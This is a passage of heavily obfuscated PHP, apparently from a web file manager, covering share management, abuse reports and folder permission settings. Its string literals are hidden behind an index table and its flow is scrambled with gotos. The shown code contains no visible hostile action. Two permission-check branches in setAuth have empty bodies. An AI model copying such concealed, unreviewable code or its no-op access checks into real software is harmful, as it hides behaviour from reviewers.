$this->where(array($FÅ—°®ÙÍÀ[440] => $d»ùÎèŠÓ))->save($d±¸‚”ÎÉ); goto dãĞ•°î¿; dãĞ•°î¿: if (isset($D©óÈÊôß¾[$FÅ—°®ÙÍÀ[2241]])) { $this->_shareAuthSet($d»ùÎèŠÓ, $D©óÈÊôß¾[$FÅ—°®ÙÍÀ[2241]]); } return !0; goto D’óØ˜‚®; a¢ƒ¢İã¾…: $this->_checkLinkShare($D©óÈÊôß¾, $aƒôÄâÂÀä); $d±¸‚”ÎÉ = array(); $fó¼ˆÍ‡š = explode($FÅ—°®ÙÍÀ[47], $FÅ—°®ÙÍÀ[2254]); goto bŠÄŒÕ„ë; D’óØ˜‚®: } private function _checkLinkShare($f±¢†îÓ×², $aø‡äÀÑÂ) { goto c¼¯Ò¥‰äº; Däê¶‡§Ò½: if ($aø‡äÀÑÂ[$A©¨ƒÂ·Äİ[391]][$A©¨ƒÂ·Äİ[29]] != $A©¨ƒÂ·Äİ[167]) { $AåîÅ˜¢œ„ = $this->_folderReport($E’£ˆ‘¿ã); if (!$AåîÅ˜¢œ„) { return; } show_json(LNG($A©¨ƒÂ·Äİ[2255]) . $A©¨ƒÂ·Äİ[2256] . $AåîÅ˜¢œ„, !1); } $bØã†¹¢â† = Model($A©¨ƒÂ·Äİ[755])->fileInfoGet($aø‡äÀÑÂ[$A©¨ƒÂ·Äİ[391]][$A©¨ƒÂ·Äİ[369]]); if (!$bØã†¹¢â†) { return; } goto D«·¯†ó´; c¼¯Ò¥‰äº: $A©¨ƒÂ·Äİ =& $_SERVER[Å¸ş]; if ($f±¢†îÓ×²[$A©¨ƒÂ·Äİ[446]] != $A©¨ƒÂ·Äİ[83]) { return; } $E’£ˆ‘¿ã = $aø‡äÀÑÂ[$A©¨ƒÂ·Äİ[391]][$A©¨ƒÂ·Äİ[369]]; goto Däê¶‡§Ò½; D«·¯†ó´: $B£â×Íãªë = $this->shareFileMeta($bØã†¹¢â†[$A©¨ƒÂ·Äİ[419]]); if (isset($B£â×Íãªë[$A©¨ƒÂ·Äİ[359]]) && $B£â×Íãªë[$A©¨ƒÂ·Äİ[359]] == $A©¨ƒÂ·Äİ[83]) { show_json(LNG($A©¨ƒÂ·Äİ[2257]), !1); } goto Bë–Ëé¸Íí; Bë–Ëé¸Íí: } private function _folderReport($EôäõÚ¼Õã) { goto e©œ¬ˆø¢ì; E¨ğùñ©¥: $D£Şäæà»ˆ = array($dÉ¶÷Ş¹Šš[419] => array($dÉ¶÷Ş¹Šš[7], $Fê«—™Í¸§), $dÉ¶÷Ş¹Šš[461] => array($dÉ¶÷Ş¹Šš[754], "\45{$B§ØÔ‹í…}\x25"), $dÉ¶÷Ş¹Šš[397] => 0); $cî¢õÈ„ì  = Model($dÉ¶÷Ş¹Šš[755])->where($D£Şäæà»ˆ)->field($dÉ¶÷Ş¹Šš[2259])->find(); if (!$cî¢õÈ„ì ) { return !1; } goto AäŞ¬ƒí; d„øìÀ§–: $BÔ¹Æ¾èîŠ = array_to_keyvalue($cæèÕ÷Ã®, $dÉ¶÷Ş¹Šš[33], $dÉ¶÷Ş¹Šš[28]); $BÔ¹Æ¾èîŠ[] = $cî¢õÈ„ì [$dÉ¶÷Ş¹Šš[28]]; return implode($dÉ¶÷Ş¹Šš[8], $BÔ¹Æ¾èîŠ); goto DÛÌ³ºŠÉ°; e©œ¬ˆø¢ì: $dÉ¶÷Ş¹Šš =& $_SERVER[Å¸ş]; $D£Şäæà»ˆ = array($dÉ¶÷Ş¹Šš[419] => array($dÉ¶÷Ş¹Šš[923], 0), $dÉ¶÷Ş¹Šš[692] => 3); $Fê«—™Í¸§ = Model($dÉ¶÷Ş¹Šš[2258])->where($D£Şäæà»ˆ)->field($dÉ¶÷Ş¹Šš[419])->select(); goto d½é×¨ ¤; AäŞ¬ƒí: $CÓÑæŸÔí = substr($cî¢õÈ„ì [$dÉ¶÷Ş¹Šš[461]], strpos($cî¢õÈ„ì [$dÉ¶÷Ş¹Šš[461]], $B§ØÔ‹í…)); $D£Şäæà»ˆ = array($dÉ¶÷Ş¹Šš[369] => array($dÉ¶÷Ş¹Šš[7], trim($CÓÑæŸÔí, $dÉ¶÷Ş¹Šš[47]))); $cæèÕ÷Ã® = Model($dÉ¶÷Ş¹Šš[755])->where($D£Şäæà»ˆ)->field($dÉ¶÷Ş¹Šš[28])->select(); goto d„øìÀ§–; d½é×¨ ¤: if (!$Fê«—™Í¸§) { return !1; } $Fê«—™Í¸§ = array_to_keyvalue($Fê«—™Í¸§, $dÉ¶÷Ş¹Šš[33], $dÉ¶÷Ş¹Šš[419]); $B§ØÔ‹í… = $dÉ¶÷Ş¹Šš[47] . $EôäõÚ¼Õã . $dÉ¶÷Ş¹Šš[47]; goto E¨ğùñ©¥; DÛÌ³ºŠÉ°: } protected function remove($E†Û­¡øÉ‰) { goto e©…ºßÉ›; e©…ºßÉ›: $F »¹š¡İÈ =& $_SERVER[Å¸ş]; if (is_array($E†Û­¡øÉ‰)) { $E†Û­¡øÉ‰ = array($F »¹š¡İÈ[7], $E†Û­¡øÉ‰); } $E¸³·àöà÷ = array($F »¹š¡İÈ[441] => $E†Û­¡øÉ‰); goto A³©Ü×Œæª; b‘—Ü¿ˆ†Ş: for ($fç¡Ù¯Èˆö = 0; $fç¡Ù¯Èˆö < count($bÌÊÂà—¼²); $fç¡Ù¯Èˆö++) { $eÍ´öÚÖ¼´ = $this->getInfo($bÌÊÂà—¼²[$fç¡Ù¯Èˆö]); if ($eÍ´öÚÖ¼´[$F »¹š¡İÈ[448]] == $F »¹š¡İÈ[83]) { Model($F »¹š¡İÈ[507])->eventShare($eÍ´öÚÖ¼´[$F »¹š¡İÈ[369]], $F »¹š¡İÈ[2246]); } if ($eÍ´öÚÖ¼´[$F »¹š¡İÈ[446]] == $F »¹š¡İÈ[83]) { Model($F »¹š¡İÈ[507])->eventShare($eÍ´öÚÖ¼´[$F »¹š¡İÈ[369]], $F »¹š¡İÈ[2245]); } } return $Dïßó²¡í; goto DØ©Äø´º; A³©Ü×Œæª: $Dïßó²¡í = $this->where($E¸³·àöà÷)->delete(); if ($Dïßó²¡í) { Model($F »¹š¡İÈ[539])->where(array($F »¹š¡İÈ[441] => $E†Û­¡øÉ‰))->delete(); } $bÌÊÂà—¼² = is_array($E†Û­¡øÉ‰) ? $E†Û­¡øÉ‰[1] : array($E†Û­¡øÉ‰); goto b‘—Ü¿ˆ†Ş; DØ©Äø´º: } protected function removeBySource($E®é–’‘Ø) { goto BÁÚêø‚İê; BÁÚêø‚İê: $DµêøÊ©•Ğ =& $_SERVER[Å¸ş]; $D¬÷÷ˆ¹æÁ = array($DµêøÊ©•Ğ[383] => array($DµêøÊ©•Ğ[384], $E®é–’‘Ø)); $e¤åŸøìÂ = $this->field($DµêøÊ©•Ğ[441])->where($D¬÷÷ˆ¹æÁ)->select(); goto Fö¯Æ…·éÛ; b¡ê­ÎîöÚ: $this->where($D¬÷÷ˆ¹æÁ)->delete(); Model($DµêøÊ©•Ğ[539])->where($D¬÷÷ˆ¹æÁ)->delete(); goto Eö—ÖÊù·‹; Fö¯Æ…·éÛ: $e¤åŸøìÂ = array_to_keyvalue($e¤åŸøìÂ, $DµêøÊ©•Ğ[33], $DµêøÊ©•Ğ[441]); if (!$e¤åŸøìÂ) { return; } $D¬÷÷ˆ¹æÁ = array($DµêøÊ©•Ğ[440] => array($DµêøÊ©•Ğ[384], $e¤åŸøìÂ)); goto b¡ê­ÎîöÚ; Eö—ÖÊù·‹: } public function listAll($D›½Çõ¼) { goto BäŞå»ˆä; BäŞå»ˆä: $bÒëĞëÇÎ² =& $_SERVER[Å¸ş]; $b„…ç±Ä¥ = array(); if ($D›½Çõ¼[$bÒëĞëÇÎ²[1436]]) { $b„…ç±Ä¥[$bÒëĞëÇÎ²[1436]] = $D›½Çõ¼[$bÒëĞëÇÎ²[1436]]; } goto A«Î¶ÃÑ†¶; A«Î¶ÃÑ†¶: if ($D›½Çõ¼[$bÒëĞëÇÎ²[705]]) { $f—¨ãù‹İ = $D›½Çõ¼[$bÒëĞëÇÎ²[449]] ? $D›½Çõ¼[$bÒëĞëÇÎ²[449]] : strtotime(date($bÒëĞëÇÎ²[2260])); $b„…ç±Ä¥[$bÒëĞëÇÎ²[187]] = array($bÒëĞëÇÎ²[321], array($D›½Çõ¼[$bÒëĞëÇÎ²[705]], $f—¨ãù‹İ)); } if ($D›½Çõ¼[$bÒëĞëÇÎ²[29]]) { $b„…ç±Ä¥[$D›½Çõ¼[$bÒëĞëÇÎ²[29]]] = 1; } else { $b„…ç±Ä¥[] = array($bÒëĞëÇÎ²[446] => array($bÒëĞëÇÎ²[923], 0), $bÒëĞëÇÎ²[448] => array($bÒëĞëÇÎ²[923], 0), $bÒëĞëÇÎ²[2236] => $bÒëĞëÇÎ²[2193]); } if ($D›½Çõ¼[$bÒëĞëÇÎ²[2189]]) { $b„…ç±Ä¥[] = array($bÒëĞëÇÎ²[443] => $D›½Çõ¼[$bÒëĞëÇÎ²[2189]], $bÒëĞëÇÎ²[1340] => array($bÒëĞëÇÎ²[754], "\x25{$D›½Çõ¼[$bÒëĞëÇÎ²[2189]]}\x25"), $bÒëĞëÇÎ²[2236] => $bÒëĞëÇÎ²[2193]); } goto C•¶ËÛ‰¦; DŒ±‘ãÕ°ö: return $eğ—à¾ËÚ²; goto A‘‰ó•‘á÷; C•¶ËÛ‰¦: $eğ—à¾ËÚ² = $this->_makeOrder()->where($b„…ç±Ä¥)->selectPage(20); if (empty($eğ—à¾ËÚ²[$bÒëĞëÇÎ²[354]])) { return array(); } $this->_listDataApply($eğ—à¾ËÚ²[$bÒëĞëÇÎ²[354]]); goto DŒ±‘ãÕ°ö; A‘‰ó•‘á÷: } public function listDataApply($dœ©œÕÎé­) { $this->_listDataApply($dœ©œÕÎé­); return $dœ©œÕÎé­; } private function _listDataApply(&$FÕ¬õÃõ…á) { goto bÉ‘Æ¶¶ˆ; d¤¸ç¢¦Ò: unset($b‡õõš†·); goto Bª†»¾Ø†ï; bÉ‘Æ¶¶ˆ: $EªÛ²„•Ô¿ =& $_SERVER[Å¸ş]; $AÒÔ‘ÃÖƒŒ = array_to_keyvalue($FÕ¬õÃõ…á, $EªÛ²„•Ô¿[33], $EªÛ²„•Ô¿[1436]); $dßÎîƒ“áÚ = Model($EªÛ²„•Ô¿[479])->userListInfo(array_unique($AÒÔ‘ÃÖƒŒ)); goto c¢±£ Œê­; c¢±£ Œê­: $f¤ŠÏÒãÎÑ = array_to_keyvalue($FÕ¬õÃõ…á, $EªÛ²„•Ô¿[33], $EªÛ²„•Ô¿[369]); $cÃ ‰•×Ê„ = Model($EªÛ²„•Ô¿[755])->sourceListInfo($f¤ŠÏÒãÎÑ, !0); foreach ($FÕ¬õÃõ…á as &$b‡õõš†·) { $CİêÊ²ó ¶ = $b‡õõš†·[$EªÛ²„•Ô¿[1436]]; $b‡õõš†·[$EªÛ²„•Ô¿[2261]] = $dßÎîƒ“áÚ[$CİêÊ²ó ¶] ? $dßÎîƒ“áÚ[$CİêÊ²ó ¶] : !1; $cˆõÒ£¿­¦ = $b‡õõš†·[$EªÛ²„•Ô¿[369]]; $b‡õõš†·[$EªÛ²„•Ô¿[391]] = $cÃ ‰•×Ê„[$cˆõÒ£¿­¦] ? $cÃ ‰•×Ê„[$cˆõÒ£¿­¦] : !1; } goto d¤¸ç¢¦Ò; Bª†»¾Ø†ï: } private function _makeOrder($FÚÈğÏ¼¢Ñ = '') { goto d” áˆÔÛÙ; d” áˆÔÛÙ: $B­¹²Í¥˜ =& $_SERVER[Å¸ş]; $A™ö‹¦°Ã = array($B­¹²Í¥˜[187], $B­¹²Í¥˜[449], $B­¹²Í¥˜[2248], $B­¹²Í¥˜[2249]); $dö¥áå½¨© = array($B­¹²Í¥˜[402] => $B­¹²Í¥˜[403], $B­¹²Í¥˜[404] => $B­¹²Í¥˜[405]); goto cË‹—»á¦Æ; d… ½°õ¨’: $FÚÈğÏ¼¢Ñ = $FÚÈğÏ¼¢Ñ . "{$Eâ‘æŒ‡Á}\x20{$FÆç’ÏÊˆ£}"; return $this->order($FÚÈğÏ¼¢Ñ); goto E­éõˆõ; cË‹—»á¦Æ: $Eâ‘æŒ‡Á = Input::get($B­¹²Í¥˜[407], $B­¹²Í¥˜[7], $B­¹²Í¥˜[389], $A™ö‹¦°Ã); $FÆç’ÏÊˆ£ = Input::get($B­¹²Í¥˜[408], $B­¹²Í¥˜[7], $B­¹²Í¥˜[2262], array($B­¹²Í¥˜[2188], $B­¹²Í¥˜[404])); $FÆç’ÏÊˆ£ = $dö¥áå½¨©[$FÆç’ÏÊˆ£]; goto d… ½°õ¨’; E­éõˆõ: } public function reportAdd($A¬ŸÂ¡–ÏÑ) { $E˜‹½¹Îä =& $_SERVER[Å¸ş]; $e½±£“ïù‡ = array($E˜‹½¹Îä[441] => $A¬ŸÂ¡–ÏÑ[$E˜‹½¹Îä[441]], $E˜‹½¹Îä[1436] => USER_ID); if (Model($E˜‹½¹Îä[2258])->where($e½±£“ïù‡)->find()) { return !1; } $f˜È¦èšÓã = array($E˜‹½¹Îä[441] => $A¬ŸÂ¡–ÏÑ[$E˜‹½¹Îä[441]], $E˜‹½¹Îä[1340] => $A¬ŸÂ¡–ÏÑ[$E˜‹½¹Îä[1340]], $E˜‹½¹Îä[369] => $A¬ŸÂ¡–ÏÑ[$E˜‹½¹Îä[369]], $E˜‹½¹Îä[419] => $A¬ŸÂ¡–ÏÑ[$E˜‹½¹Îä[419]], $E˜‹½¹Îä[1436] => USER_ID, $E˜‹½¹Îä[29] => $A¬ŸÂ¡–ÏÑ[$E˜‹½¹Îä[29]], $E˜‹½¹Îä[405] => $A¬ŸÂ¡–ÏÑ[$E˜‹½¹Îä[405]]); return Model($E˜‹½¹Îä[2258])->add($f˜È¦èšÓã); } public function reportList($AÑóŒøêä) { goto Añ°»Ç§Èô; Añ°»Ç§Èô: $dŸ¥ŞÅˆ­‰ =& $_SERVER[Å¸ş]; $FÏß’Êó¾¾ = array(); if ($AÑóŒøêä[$dŸ¥ŞÅˆ­‰[705]]) { $A”‚Ì¦‘×ë = $AÑóŒøêä[$dŸ¥ŞÅˆ­‰[449]] ? $AÑóŒøêä[$dŸ¥ŞÅˆ­‰[449]] : strtotime(date($dŸ¥ŞÅˆ­‰[2260])); $FÏß’Êó¾¾[$dŸ¥ŞÅˆ­‰[187]] = array($dŸ¥ŞÅˆ­‰[321], array($AÑóŒøêä[$dŸ¥ŞÅˆ­‰[705]], $A”‚Ì¦‘×ë)); } goto a˜ñáªß½¦; a»®áÏ±ÖÎ: if (empty($AàÓ¡÷Ó”•[$dŸ¥ŞÅˆ­‰[354]])) { return array(); } $this->_listDataApply($AàÓ¡÷Ó”•[$dŸ¥ŞÅˆ­‰[354]]); return $AàÓ¡÷Ó”•; goto E½Æé¨‚Ãñ; a˜ñáªß½¦: if (isset($AÑóŒøêä[$dŸ¥ŞÅˆ­‰[29]]) && in_array($AÑóŒøêä[$dŸ¥ŞÅˆ­‰[29]], array($dŸ¥ŞÅˆ­‰[83], $dŸ¥ŞÅˆ­‰[2263], $dŸ¥ŞÅˆ­‰[2264], $dŸ¥ŞÅˆ­‰[2265], $dŸ¥ŞÅˆ­‰[1923]))) { $FÏß’Êó¾¾[$dŸ¥ŞÅˆ­‰[29]] = $AÑóŒøêä[$dŸ¥ŞÅˆ­‰[29]]; } if (isset($AÑóŒøêä[$dŸ¥ŞÅˆ­‰[692]]) && in_array($AÑóŒøêä[$dŸ¥ŞÅˆ­‰[692]], array($dŸ¥ŞÅˆ­‰[470], $dŸ¥ŞÅˆ­‰[83], $dŸ¥ŞÅˆ­‰[2263], $dŸ¥ŞÅˆ­‰[2264]))) { $FÏß’Êó¾¾[$dŸ¥ŞÅˆ­‰[692]] = $AÑóŒøêä[$dŸ¥ŞÅˆ­‰[692]]; } $aÉ¤ÕñÔ× = Input::get($dŸ¥ŞÅˆ­‰[408], $dŸ¥ŞÅˆ­‰[7], $dŸ¥ŞÅˆ­‰[2262], array($dŸ¥ŞÅˆ­‰[2188], $dŸ¥ŞÅˆ­‰[404])); goto C…òˆÖ¾«ó; C…òˆÖ¾«ó: $Eø¿ãí¤ = array($dŸ¥ŞÅˆ­‰[402] => $dŸ¥ŞÅˆ­‰[403], $dŸ¥ŞÅˆ­‰[404] => $dŸ¥ŞÅˆ­‰[405]); $A†îôŞÆÏ = $dŸ¥ŞÅˆ­‰[2266] . $Eø¿ãí¤[$aÉ¤ÕñÔ×]; $AàÓ¡÷Ó”• = Model($dŸ¥ŞÅˆ­‰[2258])->where($FÏß’Êó¾¾)->order($A†îôŞÆÏ)->selectPage(20); goto a»®áÏ±ÖÎ; E½Æé¨‚Ãñ: } public function reportStatus($Dïãùİå·¼) { goto C„£‰Ü¼¿Ç; C„£‰Ü¼¿Ç: $B—ØÔ†ÌÜè =& $_SERVER[Å¸ş]; $c†ÓÊ‰è¦ = array($B—ØÔ†ÌÜè[367] => $Dïãùİå·¼[$B—ØÔ†ÌÜè[367]]); $AÂ…í§ñ›’ = Model($B—ØÔ†ÌÜè[2258])->where($c†ÓÊ‰è¦)->field($B—ØÔ†ÌÜè[2267])->find(); goto D£†—Ë³”¹; C¥‚‰Å•ëè: $Cµª°Å­‘§ = Model($B—ØÔ†ÌÜè[2258])->where($c†ÓÊ‰è¦)->save($Açò¢õ•ÚÓ); if ($Dïãùİå·¼[$B—ØÔ†ÌÜè[692]] == $B—ØÔ†ÌÜè[2263]) { if ($AÂ…í§ñ›’[$B—ØÔ†ÌÜè[419]] != $B—ØÔ†ÌÜè[470] && $this->shareFileMeta($AÂ…í§ñ›’[$B—ØÔ†ÌÜè[419]])) { $this->shareFileMeta($AÂ…í§ñ›’[$B—ØÔ†ÌÜè[419]], 0); } $this->remove($AÂ…í§ñ›’[$B—ØÔ†ÌÜè[441]]); return !0; } if ($Cµª°Å­‘§ && $Dïãùİå·¼[$B—ØÔ†ÌÜè[692]] == $B—ØÔ†ÌÜè[2264]) { $FÇ‰ö¢Êƒù = $Açò¢õ•ÚÓ[$B—ØÔ†ÌÜè[692]] == $B—ØÔ†ÌÜè[2264] ? 1 : 0; $this->shareFileMeta($AÂ…í§ñ›’[$B—ØÔ†ÌÜè[419]], $FÇ‰ö¢Êƒù); $this->removeByFile($AÂ…í§ñ›’[$B—ØÔ†ÌÜè[419]]); } goto f¶¢Éƒ¦ä; D£†—Ë³”¹: if (!$AÂ…í§ñ›’) { return !1; } $Açò¢õ•ÚÓ = array($B—ØÔ†ÌÜè[692] => $Dïãùİå·¼[$B—ØÔ†ÌÜè[692]]); if ($Dïãùİå·¼[$B—ØÔ†ÌÜè[692]] == $B—ØÔ†ÌÜè[2264] && $AÂ…í§ñ›’[$B—ØÔ†ÌÜè[692]] == $B—ØÔ†ÌÜè[2264]) { $Açò¢õ•ÚÓ[$B—ØÔ†ÌÜè[692]] = 0; } goto C¥‚‰Å•ëè; f¶¢Éƒ¦ä: return $Cµª°Å­‘§; goto DŸ¦—–ŸÕº; DŸ¦—–ŸÕº: } private function removeByFile($AîøÄØĞš‡) { goto F•£‘ïÚ‚ò; F•£‘ïÚ‚ò: $cêæãî•‡“ =& $_SERVER[Å¸ş]; $AÈöŸå…ƒ§ = Model($cêæãî•‡“[755])->where(array($cêæãî•‡“[419] => $AîøÄØĞš‡))->field($cêæãî•‡“[369])->select(); $Fíš…ô¨¾ = array_to_keyvalue($AÈöŸå…ƒ§, $cêæãî•‡“[33], $cêæãî•‡“[369]); goto eĞ¯¼ƒ‹­Ê; eĞ¯¼ƒ‹­Ê: $cĞ‰³“ğƒò = array($cêæãî•‡“[369] => array($cêæãî•‡“[7], $Fíš…ô¨¾), $cêæãî•‡“[446] => 1); $AÈöŸå…ƒ§ = Model($cêæãî•‡“[2085])->where($cĞ‰³“ğƒò)->field($cêæãî•‡“[441])->select(); if (empty($AÈöŸå…ƒ§)) { return; } goto d“ŒØ‚ååâ; d“ŒØ‚ååâ: $a¾Æ½„ê† = array_to_keyvalue($AÈöŸå…ƒ§, $cêæãî•‡“[33], $cêæãî•‡“[441]); $this->remove($a¾Æ½„ê†); goto cÊ–ªæÕô; cÊ–ªæÕô: } private function shareFileMeta($FèŒ‹æ‰˜œ, $eØ›¯‘ƒê‚ = null) { $b¿¼À¸±¨İ =& $_SERVER[Å¸ş]; $f©ê¹Ÿºä© = array($b¿¼À¸±¨İ[419] => $FèŒ‹æ‰˜œ, $b¿¼À¸±¨İ[89] => $b¿¼À¸±¨İ[2268]); if (is_null($eØ›¯‘ƒê‚)) { return Model($b¿¼À¸±¨İ[2269])->where($f©ê¹Ÿºä©)->find(); } $f©ê¹Ÿºä©[$b¿¼À¸±¨İ[359]] = $eØ›¯‘ƒê‚; Model($b¿¼À¸±¨İ[2269])->add($f©ê¹Ÿºä©, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\x72\143\x65\137\x61\x75\164\x68"; public function getAuth($d—…ÃŒÒ°ç) { goto B”ø™©²‚µ; CÆß÷ÎœÕ‚: $AÎ¥ƒê»  = 2 << 25; foreach ($dŞÓíïŞÀ„ as $f†®Ó‹Ò²) { goto eË«ó·áä; eË«ó·áä: $Fà²°³ä˜Ç = Model($CÄéøÛÉ„[2271])->listData($f†®Ó‹Ò²[$CÄéøÛÉ„[2252]]); if (!$Fà²°³ä˜Ç) { continue; } $féËÑ¡¨âº[] = $f†®Ó‹Ò²; goto cêÏ¼ƒŒêĞ; cêÏ¼ƒŒêĞ: $aˆïò˜‹Òå = 0; if ($f†®Ó‹Ò²[$CÄéøÛÉ„[371]] == SourceModel::TYPE_GROUP) { $aˆïò˜‹Òå = $AÎ¥ƒê»  * 2; } if ($f†®Ó‹Ò²[$CÄéøÛÉ„[371]] == SourceModel::TYPE_USER) { $aˆïò˜‹Òå = $AÎ¥ƒê» ; } goto cï…¦ã¬ø; cï…¦ã¬ø: if ($f†®Ó‹Ò²[$CÄéøÛÉ„[371]] == SourceModel::TYPE_USER && $f†®Ó‹Ò²[$CÄéøÛÉ„[458]] == $CÄéøÛÉ„[470]) { $aˆïò˜‹Òå = 0; } $b’¤¤Ş¼‘[] = $Fà²°³ä˜Ç[$CÄéøÛÉ„[376]] + $aˆïò˜‹Òå; goto eĞè­ò–˜Ì; eĞè­ò–˜Ì: } array_multisort($b’¤¤Ş¼‘, SORT_DESC, $féËÑ¡¨âº); goto AÂ¯÷Óë©‡; AÂ¯÷Óë©‡: return $féËÑ¡¨âº; goto C†ÏóŞ‚è; B”ø™©²‚µ: $CÄéøÛÉ„ =& $_SERVER[Å¸ş]; $F‰½ÉÑäÛ¢ = $CÄéøÛÉ„[2270]; $EÄöáÊƒÒ = array($CÄéøÛÉ„[369] => $d—…ÃŒÒ°ç); goto CÏğ®Äˆñ…; CÏğ®Äˆñ…: $dŞÓíïŞÀ„ = $this->field($F‰½ÉÑäÛ¢)->order($CÄéøÛÉ„[367])->where($EÄöáÊƒÒ)->select(); $féËÑ¡¨âº = array(); $b’¤¤Ş¼‘ = array(); goto CÆß÷ÎœÕ‚; C†ÏóŞ‚è: } public function setAuth($CË–ˆ×íË‰, $c¤Ü¥å‰ƒ…) { goto c­ÖÊŒºˆ³; A»ß¿±˜¥³: foreach ($c¤Ü¥å‰ƒ… as $CÕÜ±¦†ô) { if (!in_array($CÕÜ±¦†ô[$dƒ·¾íóë¢[371]], $Có‘¡½›Ô¿)) { show_json(LNG($dƒ·¾íóë¢[2272]), !1); } if ($C©šÕÃ²›˜ != $dÅŒµÂµŠ) { if ($CÕÜ±¦†ô[$dƒ·¾íóë¢[371]] == SourceModel::TYPE_GROUP) { } if ($CÕÜ±¦†ô[$dƒ·¾íóë¢[458]] != 0 && !in_array($CÕÜ±¦†ô[$dƒ·¾íóë¢[458]], $fŒ‰ ¬ Ğ’)) { } } if ($CÕÜ±¦†ô[$dƒ·¾íóë¢[458]] == 0) { $CÕÜ±¦†ô[$dƒ·¾íóë¢[371]] = SourceModel::TYPE_USER; } $C²…ä£¼ïá[] = array($dƒ·¾íóë¢[369] => $CË–ˆ×íË‰, $dƒ·¾íóë¢[371] => intval($CÕÜ±¦†ô[$dƒ·¾íóë¢[371]]), $dƒ·¾íóë¢[458] => intval($CÕÜ±¦†ô[$dƒ·¾íóë¢[458]]), $dƒ·¾íóë¢[2252] => intval($CÕÜ±¦†ô[$dƒ·¾íóë¢[2252]]) ? intval($CÕÜ±¦†ô[$dƒ·¾íóë¢[2252]]) : 0, $dƒ·¾íóë¢[2253] => intval($CÕÜ±¦†ô[$dƒ·¾íóë¢[2253]]) ? intval($CÕÜ±¦†ô[$dƒ·¾íóë¢[2253]]) : -1); } $this->where(array($dƒ·¾íóë¢[383] => $CË–ˆ×íË‰))->delete(); $this->addAll($C²…ä£¼ïá); goto eççÇ›•ç‹; c­ÖÊŒºˆ³: $dƒ·¾íóë¢ =& $_SERVER[Å¸ş]; $D£œÆ‘… = Model($dƒ·¾íóë¢[1115])->sourceInfo($CË–ˆ×íË‰); if (!$D£œÆ‘…) { return !1; } goto d‹‹¬ŠŒµù; d‹‹¬ŠŒµù: if ($D£œÆ‘…[$dƒ·¾íóë¢[371]] != SourceModel::TYPE_GROUP) { return !1; } $dÅŒµÂµŠ = 1; $C©šÕÃ²›˜ = $D£œÆ‘…[$dƒ·¾íóë¢[458]]; goto EÖñ©ù•É÷; EÖñ©ù•É÷: if ($C©šÕÃ²›˜ != $dÅŒµÂµŠ) { $a‰ÃƒãêØ¦ = array($dƒ·¾íóë¢[2108] => $C©šÕÃ²›˜); $fŒ‰ ¬ Ğ’ = Model($dƒ·¾íóë¢[2187])->field($dƒ·¾íóë¢[1436])->where($a‰ÃƒãêØ¦)->select(); $fŒ‰ ¬ Ğ’ = array_to_keyvalue($fŒ‰ ¬ Ğ’, $dƒ·¾íóë¢[33], $dƒ·¾íóë¢[1436]); } $Có‘¡½›Ô¿ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $C²…ä£¼ïá = array(); goto A»ß¿±˜¥³; eççÇ›•ç‹: return !0; goto EÜÉ¾÷”Á¡; EÜÉ¾÷”Á¡: } public function authClear($eùäí¹ùâ‹) { $CÄóÒ«ùáß =& $_SERVER[Å¸ş]; $c¢¤Ø½æ° = Model($CÄóÒ«ùáß[1115])->sourceInfo($eùäí¹ùâ‹); $fêİĞ§ˆğ = array($eùäí¹ùâ‹); if ($c¢¤Ø½æ°[$CÄóÒ«ùáß[370]] == $CÄóÒ«ùáß[83]) { $D¹Ñâ‡ÑÈ = array($CÄóÒ«ùáß[527] => array($CÄóÒ«ùáß[485], $c¢¤Ø½æ°[$CÄóÒ«ùáß[461]] . $eùäí¹ùâ‹ . $CÄóÒ«ùáß[486])); $fêİĞ§ˆğ = Model($CÄóÒ«ùáß[1115])->field($CÄóÒ«ùáß[383])->where($D¹Ñâ‡ÑÈ)->getField($CÄóÒ«ùáß[369], !0); $fêİĞ§ˆğ[] = $eùäí¹ùâ‹; } $this->where(array($CÄóÒ«ùáß[383] => array($CÄóÒ«ùáß[384], $fêİĞ§ˆğ)))->delete(); return !0; } public function getAllChildren($f™»ƒ»ÔÁ) { goto cÒ„¬…ƒ‡å; F½•±œ’ºã: if ($DŒ¡ßÃİ¥Ë[$EŸŠÍØŠ„¿[463]] == $EŸŠÍØŠ„¿[470] && $DŒ¡ßÃİ¥Ë[$EŸŠÍØŠ„¿[458]] != $b’ÅáÌÃ™³) { $EöÜ¡¨é®Ü = $this->groupChidldAllRootSource($DŒ¡ßÃİ¥Ë[$EŸŠÍØŠ„¿[458]]); } $eøåÚù×ã¼ = $this->field($EŸŠÍØŠ„¿[369])->group($EŸŠÍØŠ„¿[369])->select(); $eøåÚù×ã¼ = array_to_keyvalue($eøåÚù×ã¼, $EŸŠÍØŠ„¿[33], $EŸŠÍØŠ„¿[369]); goto c¡–®¡Ò¹‹; D•àĞ¿Õî‘: if ($DŒ¡ßÃİ¥Ë[$EŸŠÍØŠ„¿[371]] != SourceModel::TYPE_GROUP) { return array(); } $b’ÅáÌÃ™³ = 1; $EöÜ¡¨é®Ü = array($f™»ƒ»ÔÁ); goto F½•±œ’ºã; cÒ„¬…ƒ‡å: $EŸŠÍØŠ„¿ =& $_SERVER[Å¸ş]; $DŒ¡ßÃİ¥Ë = Model($EŸŠÍØŠ„¿[1115])->sourceInfo($f™»ƒ»ÔÁ); if ($DŒ¡ßÃİ¥Ë[$EŸŠÍØŠ„¿[370]] != $EŸŠÍØŠ„¿[83]) { return $this->sourceListAuth(array($f™»ƒ»ÔÁ)); } goto D•àĞ¿Õî‘; e¦½±œİŒ²: return $this->sourceListAuth($dº¤Æ‚²¥); goto eÛÎ¾¶¤Í; c‚†Û…ó›: $d“áÉƒ›–¨ = Model($EŸŠÍØŠ„¿[755])->field($eôªšëÔùÀ)->where($Fäğº˜¥İÕ)->select(); $dº¤Æ‚²¥ = array($f™»ƒ»ÔÁ); foreach ($d“áÉƒ›–¨ as $cåÖÙéâ‰È) { foreach ($EöÜ¡¨é®Ü as $AÂÒÓÍÎ¹Ó) { $B£İ°ôÏ¶ = $EŸŠÍØŠ„¿[47] . $AÂÒÓÍÎ¹Ó . $EŸŠÍØŠ„¿[47]; $E ×íÁ³ñ = $cåÖÙéâ‰È[$EŸŠÍØŠ„¿[461]] . $cåÖÙéâ‰È[$EŸŠÍØŠ„¿[369]] . $EŸŠÍØŠ„¿[47]; if (strstr($E ×íÁ³ñ, $B£İ°ôÏ¶)) { $dº¤Æ‚²¥[] = $cåÖÙéâ‰È[$EŸŠÍØŠ„¿[369]]; break; } } } goto e¦½±œİŒ²; c¡–®¡Ò¹‹: if 